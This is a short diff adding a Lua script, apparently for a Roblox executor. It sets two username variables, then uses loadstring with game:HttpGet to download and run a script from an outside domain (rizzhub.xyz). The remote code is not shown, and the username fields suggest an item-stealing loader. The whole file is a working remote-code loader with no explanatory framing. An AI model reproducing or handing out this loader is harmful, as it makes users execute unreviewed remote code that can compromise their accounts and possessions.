@@ -1,0 +1,4 @@
+UserName = "hello_cute2349"
+UserName2 = "hello_cute2349"
+ 
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
